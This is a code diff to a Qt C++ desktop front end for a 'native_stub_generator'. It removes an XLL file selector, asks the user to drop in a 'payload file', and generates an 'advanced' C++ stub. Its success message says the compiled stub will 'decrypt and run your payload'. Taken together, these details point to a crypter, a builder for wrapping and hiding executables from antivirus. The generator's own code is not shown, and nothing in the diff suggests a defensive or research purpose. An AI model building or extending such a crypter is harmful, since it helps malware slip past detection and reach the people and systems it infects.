@@ -15,11 +15,10 @@ MainWindow::MainWindow(QWidget *parent)
     setAcceptDrops(true);
 
     // Connect buttons
-    connect(ui->selectXllButton, &QPushButton::clicked, this, &MainWindow::on_selectXllButton_clicked);
     connect(ui->generateButton, &QPushButton::clicked, this, &MainWindow::on_generateButton_clicked);
 
     ui->generateButton->setEnabled(false);
-    ui->statusLabel->setText("Waiting for input...");
+    ui->statusLabel->setText("Drag and drop your payload file here...");
 }
 
 MainWindow::~MainWindow()
@@ -46,36 +45,26 @@ void MainWindow::dropEvent(QDropEvent *event)
     }
 }
 
-void MainWindow::on_selectXllButton_clicked()
-{
-    QString file = QFileDialog::getOpenFileName(this, "Select XLL File", "", "XLL Files (*.xll);;All Files (*)");
-    if (!file.isEmpty()) {
-        xllFile = file;
-        ui->selectXllButton->setText("XLL: " + QFileInfo(xllFile).fileName());
-        checkReady();
-    }
-}
-
 void MainWindow::on_generateButton_clicked()
 {
     QString outputStub = QFileDialog::getSaveFileName(this, "Save Stub As", "", "C++ Files (*.cpp);;All Files (*)");
     if (outputStub.isEmpty()) return;
 
-    // Build command - currently only uses payload, output
-    // If you want to use xllFile as an argument, update native_stub_generator to accept a third file
-    QString cmd = QString("./native_stub_generator \"%1\" \"%2\"").arg(payloadFile, outputStub);
+    // Build command for native_stub_generator
+    QString cmd = QString("./native_stub_generator \"%1\" \"%2\" advanced").arg(payloadFile, outputStub);
     QProcess process;
     process.start(cmd);
     process.waitForFinished();
     int ret = process.exitCode();
     if (ret == 0) {
-        QMessageBox::information(this, "Done", "Stub generated! Now compile the stub in C++ (VS or g++).");
+        QMessageBox::information(this, "Success", "Advanced stub generated successfully!\n\nNext steps:\n1. Compile the generated .cpp file\n2. The compiled executable will decrypt and run your payload");
     } else {
-        QMessageBox::critical(this, "Error", "Failed to generate stub. Check input files and try again.");
+        QString errorOutput = process.readAllStandardError();
+        QMessageBox::critical(this, "Error", "Failed to generate stub.\n\nError details:\n" + errorOutput);
     }
 }
 
 void MainWindow::checkReady()
 {
-    ui->generateButton->setEnabled(!payloadFile.isEmpty() && !xllFile.isEmpty());
+    ui->generateButton->setEnabled(!payloadFile.isEmpty());
 }
